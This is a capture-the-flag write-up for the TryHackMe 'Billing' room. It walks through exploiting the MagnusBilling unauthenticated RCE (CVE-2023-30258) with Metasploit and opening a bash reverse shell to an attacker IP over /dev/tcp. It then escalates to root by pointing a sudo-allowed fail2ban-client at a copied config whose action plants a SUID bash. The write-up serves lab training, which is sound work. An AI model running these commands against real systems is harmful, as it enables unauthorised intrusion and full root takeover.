# Billing — TryHackMe Write-Up

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Author:** XENOS  

---

## Summary

This room involves exploiting an unauthenticated Remote Command Execution vulnerability in **MagnusBilling**, a VoIP billing and management system. After gaining an initial foothold as the `asterisk` user, we escalate to root by abusing **sudo permissions** over `fail2ban-client` with a custom configuration directory.

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -T4 billing.thm
```

The scan reveals four open ports. The key ones:

| Port | Service | Details |
|------|---------|---------|
| 80   | HTTP    | Web server |
| 3306 | MySQL   | MariaDB |
| 5038 | AMI     | Asterisk Call Manager |

The default script scan also reads `robots.txt`, revealing a disallowed entry:

```
/mbilling/
```

### Web Enumeration

Visiting `http://billing.thm/mbilling/` presents a login page with the title **MagnusBilling** — an open-source VoIP billing and management system used for managing SIP trunks, VoIP calls, customer billing, call routing, and monitoring.

A quick search reveals that this application has a known critical vulnerability: **CVE-2023-30258**, an unauthenticated Remote Command Execution.

---

## Foothold — Shell as `asterisk`

### CVE-2023-30258 — MagnusBilling Unauthenticated RCE

This vulnerability allows an unauthenticated attacker to execute arbitrary commands on the server through a flaw in the MagnusBilling application.

We exploit it using the Metasploit framework:

```bash
msfconsole
msf6 > search magnus
msf6 > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
msf6 exploit(...) > set RHOSTS billing.thm
msf6 exploit(...) > set LHOST <YOUR_IP>
msf6 exploit(...) > run
```

This gives us a Meterpreter session as the user **`asterisk`**.

### Upgrading the Shell

We set up a separate listener and send a reverse shell from Meterpreter to get a fully interactive TTY:

```bash
# On attacker machine
nc -lvnp 9001

# Inside Meterpreter
shell
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1'
```

Then upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

Checking `/etc/passwd` reveals another user: **`magnus`**. We have read access to their home directory:

```bash
cat /home/magnus/user.txt
```

---

## Privilege Escalation — Shell as `root`

### Sudo Permissions

```bash
sudo -l
```

Output:

```
User asterisk may run the following commands on billing:
    (root) NOPASSWD: /usr/bin/fail2ban-client
```

We can run `fail2ban-client` as root without a password.

### Understanding the Attack Surface

**Fail2ban** is a security daemon that monitors log files for suspicious activity (like repeated failed login attempts) and automatically blocks offending IP addresses via firewall rules.

The key insight: `fail2ban-client` accepts a `-c` flag to specify a **custom configuration directory**. If we control the config, we control what commands run as root.

The default `/etc/fail2ban/` directory is read-only for us, but nothing stops us from copying it somewhere writable.

### Exploitation

**Step 1 — Copy the config directory to `/tmp`:**

```bash
rsync -av /etc/fail2ban/ /tmp/fail2ban/
```

**Step 2 — Write a malicious script:**

```bash
cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF

chmod +x /tmp/script
```

This script copies `/bin/bash` to `/tmp/bash` and sets the **SUID bit** on it. When executed with `-p`, it preserves the effective UID of root.

**Step 3 — Create a custom Fail2ban action that runs our script on startup:**

```bash
cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF
```

**Step 4 — Add a custom jail that uses this action:**

```bash
cat >> /tmp/fail2ban/jail.local <<EOF

[my-custom-jail]
enabled = true
action = custom-start-command
EOF
```

**Step 5 — Create an empty filter for the jail (required by Fail2ban):**

```bash
cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
[Definition]
EOF
```

**Step 6 — Restart Fail2ban using our custom config directory:**

```bash
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```

When Fail2ban restarts, it reads our config and executes `actionstart` — our script — as **root**.

**Step 7 — Drop into a root shell:**

```bash
/tmp/bash -p
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Vulnerability Summary

| Vulnerability | Impact |
|---------------|--------|
| CVE-2023-30258 — MagnusBilling Unauthenticated RCE | Remote code execution without authentication |
| Sudo misconfiguration on `fail2ban-client` | Local privilege escalation to root |

---

## Key Takeaways

- Always check `robots.txt` during web enumeration — disallowed entries often reveal sensitive paths.
- Unauthenticated RCE vulnerabilities in management panels are extremely dangerous; keep software up to date.
- `fail2ban-client` with sudo and the `-c` flag is a known privilege escalation vector. When auditing sudo permissions, pay attention to binaries that accept **config paths as arguments**.
- Even if a directory is read-only, copying it elsewhere and referencing the copy can fully bypass that restriction.

---

*Write-up by [XENOS](https://github.com/obadahamed)*
